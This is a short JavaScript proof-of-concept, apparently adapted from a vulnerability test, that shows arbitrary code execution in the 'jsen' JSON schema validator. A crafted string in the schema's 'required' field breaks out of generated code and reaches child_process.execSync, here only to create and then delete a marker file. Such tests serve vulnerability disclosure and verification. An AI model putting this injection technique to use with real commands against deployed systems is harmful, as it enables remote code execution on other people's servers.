// test("Arbitrary code execution in jsen", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const jsen = require("jsen");
  const path = "./jsen";
  
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  
  let schema = JSON.parse(
    JSON.stringify({
      type: "object",
      properties: { username: { type: "string" } },
      required: [
        "\"+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('fsutil file createnew jsen 0')+\""
      ],
    })
  );
  try {
    const validate = jsen(schema);
    validate({});
  } catch (e) {}

  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  
  fs.unlink(path, function (err) {});
// });
